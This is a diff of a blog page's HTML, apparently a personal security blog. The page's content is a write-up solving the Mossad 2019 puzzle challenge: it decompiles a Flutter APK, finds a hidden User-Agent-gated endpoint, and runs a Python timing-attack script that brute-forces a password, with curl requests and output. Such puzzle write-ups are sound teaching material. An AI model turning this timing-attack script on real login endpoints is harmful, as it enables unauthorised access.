@@ -19,14 +19,14 @@
     <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1">
     <meta name=viewport content="width=device-width, initial-scale=1">
 
-    <meta name=description content="Security enthusiast, developer, and blogger (sometimes)">
+    <meta name=description content="My security research blog">
     <meta name=author content="Yanir Tsarimi">
     <meta property="og:image" content="https://yanir.dev//assets/images/profile.jpg">
     <meta property="og:type" content="profile">
 
-    <!-- Begin Jekyll SEO tag v2.5.0 -->
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>The Mossad 2019 Challenge - Part 1 | Yanir Tsarimi</title>
-<meta name="generator" content="Jekyll v3.8.5" />
+<meta name="generator" content="Jekyll v3.9.3" />
 <meta property="og:title" content="The Mossad 2019 Challenge - Part 1" />
 <meta name="author" content="yanir" />
 <meta property="og:locale" content="en_US" />
@@ -36,12 +36,13 @@
 <meta property="og:url" content="https://yanir.dev//The-Mossad-2019-Challenge-Part-1/" />
 <meta property="og:site_name" content="Yanir Tsarimi" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2019-05-22T00:00:00+03:00" />
+<meta property="article:published_time" content="2019-05-16T22:00:00+04:00" />
 <meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="The Mossad 2019 Challenge - Part 1" />
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@yanir" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"The Mossad 2019 Challenge - Part 1","url":"https://yanir.dev//The-Mossad-2019-Challenge-Part-1/","dateModified":"2019-05-22T00:00:00+03:00","datePublished":"2019-05-22T00:00:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://yanir.dev//The-Mossad-2019-Challenge-Part-1/"},"author":{"@type":"Person","name":"yanir"},"description":"The 4th Mossad’s challenge for Israel’s independence day begun in 8th of May, 2019. Like the previous challenges, it requires some research and some “out of the box” thinking. In the following article(s), I will go through all 3 challenges and explain my solutions.","@context":"http://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"yanir"},"dateModified":"2019-05-16T22:00:00+04:00","datePublished":"2019-05-16T22:00:00+04:00","description":"The 4th Mossad’s challenge for Israel’s independence day begun in 8th of May, 2019. Like the previous challenges, it requires some research and some “out of the box” thinking. In the following article(s), I will go through all 3 challenges and explain my solutions.","headline":"The Mossad 2019 Challenge - Part 1","mainEntityOfPage":{"@type":"WebPage","@id":"https://yanir.dev//The-Mossad-2019-Challenge-Part-1/"},"url":"https://yanir.dev//The-Mossad-2019-Challenge-Part-1/"}</script>
 <!-- End Jekyll SEO tag -->
 
     
@@ -1186,7 +1187,7 @@ pre {
   margin: 6rem auto;
   width: 100%; }
   .breaker:before {
-    content: "ΓÇó ΓÇó ΓÇó";
+    content: "• • •";
     width: 100%;
     text-align: center;
     display: block;
@@ -1429,12 +1430,6 @@ pre {
         
 
         
-            
-                <li class="item">
-                    <a class="link" href="https://yanir.dev//about">About</a>
-                </li>
-            
-        
 
         
     </ul>
@@ -1447,7 +1442,7 @@ pre {
 <h1 class="title">The Mossad 2019 Challenge - Part 1</h1>
 
 <span class="date">
-    <time datetime="22-05-2019">Wednesday. May 22, 2019</time>
+    <time datetime="16-05-2019">Thursday. May 16, 2019</time>
     
 </span>
 
@@ -1472,10 +1467,10 @@ In the following article(s), I will go through all 3 challenges and explain my s
 
 <p>This picture is basically a binary pattern with the Mossad’s logo. If we convert them to decimal, we’ll get the 4 octets of presumably, an IP address.</p>
 
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="mo">00100011</span> <span class="o">=</span> <span class="mi">35</span>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="mi">00100011</span> <span class="o">=</span> <span class="mi">35</span>
 <span class="mi">11110110</span> <span class="o">=</span> <span class="mi">246</span>
 <span class="mi">10011110</span> <span class="o">=</span> <span class="mi">158</span>
-<span class="mo">00110011</span> <span class="o">=</span> <span class="mi">51</span></code></pre></figure>
+<span class="mi">00110011</span> <span class="o">=</span> <span class="mi">51</span></code></pre></figure>
 
 <p>After visiting 35.246.158.51, we’ll be redirected to the first challenge:</p>
 
@@ -1485,7 +1480,7 @@ In the following article(s), I will go through all 3 challenges and explain my s
 It’s important to not just extract the file like a zip, because it contains Android Binary XML files, which you would just need to decode manually.
 In this case we’ll use <a href="https://ibotpeaches.github.io/Apktool/">apktool</a> to disassemble the APK.</p>
 
-<p>After extracting the files, we’ll look at <code class="highlighter-rouge">AndroidManifset.xml</code>. This xml contains valuable information, such as the package name, permissions, and more.</p>
+<p>After extracting the files, we’ll look at <code class="language-plaintext highlighter-rouge">AndroidManifset.xml</code>. This xml contains valuable information, such as the package name, permissions, and more.</p>
 
 <figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</span><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span> <span class="na">package=</span><span class="s">"com.iwalk.locksmither"</span> <span class="na">platformBuildVersionCode=</span><span class="s">"1"</span> <span class="na">platformBuildVersionName=</span><span class="s">"1.0.0"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.INTERNET"</span><span class="nt">/&gt;</span>
@@ -1505,9 +1500,9 @@ In this case we’ll use <a href="https://ibotpeaches.github.io/Apktool/">apktoo
 
 <p>Flutter is used to develop native apps. Flutter apps are developed in the Dart programming language - also developed by Google.
 When you build a Flutter app, the Dart kernel (“an intermediate language for Dart programs”) takes your Dart code and creates kernel bytecode.
-That bytecode is usually saved in the <code class="highlighter-rouge">kernel_blob.bin</code> file, which we’ll look at now.</p>
+That bytecode is usually saved in the <code class="language-plaintext highlighter-rouge">kernel_blob.bin</code> file, which we’ll look at now.</p>
 
-<p>In the <code class="highlighter-rouge">assets/flutter_assets/</code> folder, we can find the kernel_blob file. By running <code class="highlighter-rouge">strings</code> on it, we can view the source code directly.
+<p>In the <code class="language-plaintext highlighter-rouge">assets/flutter_assets/</code> folder, we can find the kernel_blob file. By running <code class="language-plaintext highlighter-rouge">strings</code> on it, we can view the source code directly.
 Here’s an interesting portion of the code:</p>
 
 <figure class="highlight"><pre><code class="language-dart" data-lang="dart"><span class="nl">file:</span><span class="c1">///C:/Users/USER/Desktop/2019/client/locksmither/lib/network/network_actions.dart</span>
@@ -1540,7 +1535,7 @@ Here’s an interesting portion of the code:</p>
         <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
       <span class="o">});</span></code></pre></figure>
 
-<p>Looking at this code, we can infer that a request is being sent to <code class="highlighter-rouge">http://35.246.158.51:8070/auth/getUrl</code> to retrieve the authentication URL,
+<p>Looking at this code, we can infer that a request is being sent to <code class="language-plaintext highlighter-rouge">http://35.246.158.51:8070/auth/getUrl</code> to retrieve the authentication URL,
 and then an additional POST request is sent with a JSON containing a seed and a password.</p>
 
 <p>Let’s try that:</p>
@@ -1550,7 +1545,7 @@ and then an additional POST request is sent with a JSON containing a seed and a 
 root@beer:~# curl <span class="nt">-d</span> <span class="s1">'{"Password":"password", "Seed":"test"}'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-X</span> POST http://35.246.158.51:8070/auth/v2
 <span class="o">{</span><span class="s2">"IsValid"</span>:false,<span class="s2">"LockURL"</span>:<span class="s2">""</span>,<span class="s2">"Time"</span>:142220<span class="o">}</span></code></pre></figure>
 
-<p>Interesting. So what we know so far is that in order to authenticate, we need to give a valid seed and password. The server returns <code class="highlighter-rouge">Time</code> which is probably the time taken to process the request.
+<p>Interesting. So what we know so far is that in order to authenticate, we need to give a valid seed and password. The server returns <code class="language-plaintext highlighter-rouge">Time</code> which is probably the time taken to process the request.
 The time hints that this server is vulnerable to a timing attack.</p>
 
 <h2 id="timing-attacks">Timing attacks?</h2>
@@ -1561,11 +1556,11 @@ Then, you can bruteforce all characters and measure the time, and see which char
 
 <p><img src="/assets/mossad_challenge/timing_attacks.png" alt="" class="marginleft25" /></p>
 
-<p>So, after playing with the <code class="highlighter-rouge">/auth/v2</code> endpoint for a while, I could see the returned time is pretty much inconsistent, and a timing attack wouldn’t work on this endpoint.</p>
+<p>So, after playing with the <code class="language-plaintext highlighter-rouge">/auth/v2</code> endpoint for a while, I could see the returned time is pretty much inconsistent, and a timing attack wouldn’t work on this endpoint.</p>
 
 <p>Let’s go back a bit, remember the “look for us on github” from the manifest? By searching for “iwalk” on github, we can find an interesting user: <a href="https://github.com/iwalk-locksmithers-app">iwalk-locksmithers-app</a>
 The user has a “server” repo which contains the <a href="https://github.com/iwalk-locksmithers-app/server/blob/master/main.go">source code</a> for the server.
-By looking at the code, we can see that there’s an <code class="highlighter-rouge">/auth/v1_1</code> endpoint available, only if we set our <code class="highlighter-rouge">User-Agent</code> header to <code class="highlighter-rouge">ed9ae2c0-9b15-4556-a393-23d500675d4b</code>!
+By looking at the code, we can see that there’s an <code class="language-plaintext highlighter-rouge">/auth/v1_1</code> endpoint available, only if we set our <code class="language-plaintext highlighter-rouge">User-Agent</code> header to <code class="language-plaintext highlighter-rouge">ed9ae2c0-9b15-4556-a393-23d500675d4b</code>!
 Let’s see if it’s working in the remote server:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@beer:~/m2019/app/assets/flutter_assets# curl <span class="nt">-H</span> <span class="s2">"User-Agent: ed9ae2c0-9b15-4556-a393-23d500675d4b"</span> http://35.246.158.51:8070/auth/getUrl
@@ -1575,29 +1570,29 @@ root@beer:~# curl <span class="nt">-H</span> <span class="s2">"User-Agent: ed9ae
 root@beer:~# curl <span class="nt">-H</span> <span class="s2">"User-Agent: ed9ae2c0-9b15-4556-a393-23d500675d4b"</span> http://35.246.158.51:8070/auth/v1_1
 <span class="o">{</span><span class="s2">"IsValid"</span>:false,<span class="s2">"LockURL"</span>:<span class="s2">""</span>,<span class="s2">"Time"</span>:6608<span class="o">}</span></code></pre></figure>
 
-<p>Let’s look at the password check code for the <code class="highlighter-rouge">/auth/v1_1</code> endpoint:</p>
+<p>Let’s look at the password check code for the <code class="language-plaintext highlighter-rouge">/auth/v1_1</code> endpoint:</p>
 
-<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">for</span><span class="x"> </span><span class="n">_</span><span class="p">,</span><span class="x"> </span><span class="n">lock</span><span class="x"> </span><span class="o">:=</span><span class="x"> </span><span class="k">range</span><span class="x"> </span><span class="n">getLocks</span><span class="p">()</span><span class="x"> </span><span class="p">{</span><span class="x">
-		</span><span class="k">if</span><span class="x"> </span><span class="n">loginData</span><span class="o">.</span><span class="n">Seed</span><span class="x"> </span><span class="o">!=</span><span class="x"> </span><span class="n">lock</span><span class="o">.</span><span class="n">Seed</span><span class="x"> </span><span class="p">{</span><span class="x">
-			</span><span class="k">continue</span><span class="x">
-		</span><span class="p">}</span><span class="x">
+<figure class="highlight"><pre><code class="language-go" data-lang="go"><span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">lock</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">getLocks</span><span class="p">()</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="n">loginData</span><span class="o">.</span><span class="n">Seed</span> <span class="o">!=</span> <span class="n">lock</span><span class="o">.</span><span class="n">Seed</span> <span class="p">{</span>
+			<span class="k">continue</span>
+		<span class="p">}</span>
 
-		</span><span class="n">currentIndex</span><span class="x"> </span><span class="o">:=</span><span class="x"> </span><span class="m">0</span><span class="x">
-		</span><span class="k">for</span><span class="x"> </span><span class="n">currentIndex</span><span class="x"> </span><span class="o">&lt;</span><span class="x"> </span><span class="nb">len</span><span class="p">(</span><span class="n">lock</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span><span class="x"> </span><span class="o">&amp;&amp;</span><span class="x"> </span><span class="n">currentIndex</span><span class="x"> </span><span class="o">&lt;</span><span class="x"> </span><span class="nb">len</span><span class="p">(</span><span class="n">loginData</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span><span class="x"> </span><span class="p">{</span><span class="x">
-			</span><span class="k">if</span><span class="x"> </span><span class="n">lock</span><span class="o">.</span><span class="n">Password</span><span class="p">[</span><span class="n">currentIndex</span><span class="p">]</span><span class="x"> </span><span class="o">!=</span><span class="x"> </span><span class="n">loginData</span><span class="o">.</span><span class="n">Password</span><span class="p">[</span><span class="n">currentIndex</span><span class="p">]</span><span class="x"> </span><span class="p">{</span><span class="x">
-				</span><span class="k">break</span><span class="x">
-			</span><span class="p">}</span><span class="x">
-			</span><span class="c">//OG: securing against bruteforce attempts... ;-)</span><span class="x">
-			</span><span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="m">30</span><span class="x"> </span><span class="o">*</span><span class="x"> </span><span class="n">time</span><span class="o">.</span><span class="n">Millisecond</span><span class="p">)</span><span class="x">
-			</span><span class="n">currentIndex</span><span class="o">++</span><span class="x">
-		</span><span class="p">}</span><span class="x">
+		<span class="n">currentIndex</span> <span class="o">:=</span> <span class="m">0</span>
+		<span class="k">for</span> <span class="n">currentIndex</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">lock</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">currentIndex</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">loginData</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">if</span> <span class="n">lock</span><span class="o">.</span><span class="n">Password</span><span class="p">[</span><span class="n">currentIndex</span><span class="p">]</span> <span class="o">!=</span> <span class="n">loginData</span><span class="o">.</span><span class="n">Password</span><span class="p">[</span><span class="n">currentIndex</span><span class="p">]</span> <span class="p">{</span>
+				<span class="k">break</span>
+			<span class="p">}</span>
+			<span class="c">//OG: securing against bruteforce attempts... ;-)</span>
+			<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="m">30</span> <span class="o">*</span> <span class="n">time</span><span class="o">.</span><span class="n">Millisecond</span><span class="p">)</span>
+			<span class="n">currentIndex</span><span class="o">++</span>
+		<span class="p">}</span>
 
-		</span><span class="k">if</span><span class="x"> </span><span class="n">currentIndex</span><span class="x"> </span><span class="o">==</span><span class="x"> </span><span class="nb">len</span><span class="p">(</span><span class="n">lock</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span><span class="x"> </span><span class="p">{</span><span class="x">
-			</span><span class="n">ret</span><span class="x"> </span><span class="o">:=</span><span class="x"> </span><span class="n">getResponseToken</span><span class="p">(</span><span class="n">start</span><span class="p">,</span><span class="x"> </span><span class="no">true</span><span class="p">,</span><span class="x"> </span><span class="n">lock</span><span class="o">.</span><span class="n">Value</span><span class="p">)</span><span class="x">
-			</span><span class="n">returnToken</span><span class="p">(</span><span class="n">w</span><span class="p">,</span><span class="x"> </span><span class="n">ret</span><span class="p">)</span><span class="x">
-			</span><span class="k">return</span><span class="x">
-		</span><span class="p">}</span><span class="x">
-	</span><span class="p">}</span></code></pre></figure>
+		<span class="k">if</span> <span class="n">currentIndex</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">lock</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">ret</span> <span class="o">:=</span> <span class="n">getResponseToken</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="no">true</span><span class="p">,</span> <span class="n">lock</span><span class="o">.</span><span class="n">Value</span><span class="p">)</span>
+			<span class="n">returnToken</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">ret</span><span class="p">)</span>
+			<span class="k">return</span>
+		<span class="p">}</span>
+	<span class="p">}</span></code></pre></figure>
 
 <p>So it seems like the code sleeps for 30ms for every correct character we hit. Also, it checks the string up to the length of the password, so even if the password is “1234”, the password “123456” would work as well.
 We now know that we can perform a timing attack on this endpoint. However we still need the seed. Remember the beginning of the challenge where we were given a ‘client id’? We’ll use this as the seed.</p>
@@ -1608,7 +1603,7 @@ We now know that we can perform a timing attack on this endpoint. However we sti
 <span class="kn">import</span> <span class="nn">sys</span>
 
 <span class="n">SEED</span> <span class="o">=</span> <span class="s">"e0399b34b74742bd96ec84d3102c88ad"</span>
-<span class="n">CHARSET</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+<span class="n">CHARSET</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
 <span class="n">ENDPOINT</span> <span class="o">=</span> <span class="s">"http://35.246.158.51:8070/auth/v1_1"</span>
 <span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span>
 	<span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'ed9ae2c0-9b15-4556-a393-23d500675d4b'</span>
@@ -1621,11 +1616,11 @@ We now know that we can perform a timing attack on this endpoint. However we sti
         <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
             <span class="n">password</span> <span class="o">=</span> <span class="n">current_password</span> <span class="o">+</span> <span class="n">char</span>
             <span class="n">json_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Password'</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s">'Seed'</span><span class="p">:</span> <span class="n">SEED</span><span class="p">}</span>
-            <span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">ENDPOINT</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
-            <span class="n">json_response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">ENDPOINT</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">)</span>
+            <span class="n">json_response</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
             <span class="k">if</span> <span class="n">json_response</span><span class="p">[</span><span class="s">"IsValid"</span><span class="p">]:</span>
                 <span class="k">print</span><span class="p">(</span><span class="n">json_response</span><span class="p">)</span>
-                <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+                <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
             <span class="n">ms_difference</span> <span class="o">=</span> <span class="p">(</span><span class="n">json_response</span><span class="p">[</span><span class="s">"Time"</span><span class="p">]</span> <span class="o">/</span> <span class="mf">1000000.0</span><span class="p">)</span> <span class="o">-</span> <span class="n">current_milliseconds_time</span>
             <span class="k">if</span> <span class="n">ms_difference</span> <span class="o">&gt;</span> <span class="mi">25</span><span class="p">:</span>
                 <span class="n">current_password</span> <span class="o">+=</span> <span class="n">char</span>
@@ -1638,7 +1633,7 @@ We now know that we can perform a timing attack on this endpoint. However we sti
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span></code></pre></figure>
 
-<p>In this example script, you bruteforce the password with the character set of lowercase letters and digits (originally I used all letters and special characters too, but I changed it after observing the pattern of the password). We convert the <code class="highlighter-rouge">Time</code> from nanoseconds to milliseconds, and add the character to the <code class="highlighter-rouge">current_password</code> if there’s a 25ms or more difference between the two.</p>
+<p>In this example script, you bruteforce the password with the character set of lowercase letters and digits (originally I used all letters and special characters too, but I changed it after observing the pattern of the password). We convert the <code class="language-plaintext highlighter-rouge">Time</code> from nanoseconds to milliseconds, and add the character to the <code class="language-plaintext highlighter-rouge">current_password</code> if there’s a 25ms or more difference between the two.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@beer:~# python3 script.py
 Current password: a
@@ -1869,7 +1864,7 @@ Current password: a39dc4afebd2409f88528650841fd51
 
 
 <footer class="footer-main">
-    Yanir Tsarimi © 2019 <a class="link" href="https://yanir.dev//feed.xml" target="_blank"><svg class="icon icon-rss"><use xlink:href="#icon-rss"></use></svg></a>
+    Yanir Tsarimi © 2023 <a class="link" href="https://yanir.dev//feed.xml" target="_blank"><svg class="icon icon-rss"><use xlink:href="#icon-rss"></use></svg></a>
 
     <p class="extra">
         <a class="link" href="https://github.com/sergiokopplin/indigo">Indigo theme</a> by <a class="link" href="https://github.com/sergiokopplin/indigo">Kopplin</a>
